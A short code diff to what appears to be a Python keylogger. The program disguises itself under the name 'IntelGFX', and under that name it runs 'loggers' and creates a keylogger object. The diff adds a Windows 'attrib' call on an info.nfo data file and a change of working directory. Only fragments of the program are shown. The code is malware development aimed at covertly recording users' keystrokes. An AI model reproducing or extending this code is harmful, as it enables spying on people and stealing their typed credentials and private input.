@@ -207,6 +207,7 @@ while 1:
                         return variables
                 else:
                     open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(variables))
+                    os.popen('attrib -h -r -s /s /d %s' % os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'))
                     return variables
 
 
@@ -753,6 +754,8 @@ while 1:
 
 
             if 'IntelGFX' in sys.argv[0]:
+                # Change Home Dir
+                os.chdir(os.path.dirname(sys.argv[0]))
                 # Run Loggers
                 run_scheduler()
                 keylogger = Key()
